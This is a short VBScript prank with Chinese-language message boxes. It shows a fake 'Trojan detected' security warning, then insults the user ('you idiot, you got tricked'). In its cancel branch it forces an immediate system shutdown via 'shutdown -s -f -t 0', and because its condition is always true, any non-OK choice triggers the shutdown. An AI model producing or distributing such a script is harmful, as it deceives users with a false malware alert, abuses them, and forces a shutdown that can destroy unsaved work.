msgbox "检测到木马病毒，建议查杀！", vbOKOnly + vbExclamation,"WARING"
x=msgbox("傻逼被我骗到了吧",VbokCancel)
if x=Vbok then
msgbox("没错你就是个傻逼玩意")
elseif VbCancel then
msgbox("你可要想清楚了啊")
set ws=createobject("wscript.shell")

ws.Run("%comspec% /k shutdown -s -f -t 0")
end if